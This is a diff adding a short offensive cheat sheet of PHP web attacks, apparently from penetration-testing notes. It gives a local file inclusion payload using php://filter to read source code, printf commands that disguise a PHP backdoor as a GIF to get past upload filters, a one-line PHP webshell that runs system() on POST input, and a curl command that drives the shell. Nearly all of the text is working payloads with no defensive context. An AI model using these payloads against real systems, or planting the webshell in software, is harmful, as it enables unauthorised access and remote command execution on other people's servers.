@@ -1,0 +1,30 @@
+=== php
+
+==== Local File Inclusion
+
+If you have
+
+ include($_GET['page'] . ".php");
+
+You can reveal php contents with:
+
+ ?page=php://filter/convert.base64-encode/resource=index
+
+and some clever scripting.
+
+==== Image Upload
+
+1. Try just taking on an extension: `backdoor.php.gif`
+2. Try prefixing the file with a small gif:
+
+  printf "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x00\xff\x00" > backdoor.php.gif
+  printf "\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00\x3b" >> backdoor.php.gif
+  cat backdoor.php >> backdoor.php.gif
+
+==== Webshell
+
+  <?php @system($_POST['cmd']); ?>
+
+Use it with curl:
+
+  curl -d 'cmd=/usr/bin/id' http://target/shell.php
